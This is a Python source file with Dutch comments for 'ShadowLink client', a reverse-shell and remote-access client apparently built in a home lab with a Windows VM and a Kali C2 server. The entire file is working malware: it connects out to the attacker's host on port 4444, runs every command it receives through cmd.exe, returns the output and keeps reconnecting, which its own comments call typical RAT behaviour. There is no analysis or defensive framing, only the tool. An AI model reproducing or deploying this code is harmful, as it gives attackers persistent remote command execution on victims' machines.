#!/usr/bin/env python3
"""
ShadowLink client - Fase 2 v1 (basis reverse shell, onversleuteld)
Draait op de Windows VM (doelsysteem). Maakt zelf een uitgaande TCP-
verbinding naar de C2-server op Kali en voert ontvangen commando's uit
via cmd.exe (subprocess met shell=True).

Dit is het klassieke "reverse" principe: de verbinding loopt van slachtoffer
naar aanvaller, waardoor inbound-firewallregels en NAT geen probleem zijn.
"""
import os
import socket
import struct
import subprocess
import time

SERVER_HOST = "192.168.174.128"  # Kali, host-only interface eth1
SERVER_PORT = 4444
RECONNECT_DELAY = 5              # seconden wachten bij mislukte (her)verbinding


def send_msg(sock, data: bytes):
    sock.sendall(struct.pack("!I", len(data)) + data)


def recv_msg(sock) -> bytes | None:
    header = b""
    while len(header) < 4:
        chunk = sock.recv(4 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!I", header)[0]

    payload = b""
    while len(payload) < length:
        chunk = sock.recv(min(4096, length - len(payload)))
        if not chunk:
            return None
        payload += chunk
    return payload


def execute(cmd: str) -> bytes:
    # 'cd' moet in het Python-proces zelf gebeuren: een subshell verdwijnt
    # meteen weer, dus cd via subprocess heeft geen blijvend effect.
    if cmd.strip().lower().startswith("cd "):
        target = cmd.strip()[3:].strip()
        try:
            os.chdir(target)
            return f"[+] Map: {os.getcwd()}".encode("utf-8", errors="replace")
        except OSError as e:
            return f"[-] cd mislukt: {e}".encode("utf-8", errors="replace")

    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=60
        )
        output = proc.stdout + proc.stderr
        return output if output else b"[no output]"
    except subprocess.TimeoutExpired:
        return b"[-] Commando timeout (60s)"
    except Exception as e:
        return f"[-] Fout: {e}".encode("utf-8", errors="replace")


def session(sock):
    while True:
        cmd_bytes = recv_msg(sock)
        if cmd_bytes is None:
            return  # server weg -> opnieuw verbinden
        cmd = cmd_bytes.decode("utf-8", errors="replace").strip()
        if cmd.lower() in ("exit", "quit"):
            sock.close()
            raise SystemExit(0)
        send_msg(sock, execute(cmd))


def main():
    # Herverbindings-loop  Start opnieuw verbinden als de server (nog) niet
    # luistert of de verbinding wegvalt. Dit is typisch RAT-gedrag.
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            session(sock)
        except SystemExit:
            raise
        except (ConnectionRefusedError, OSError):
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()

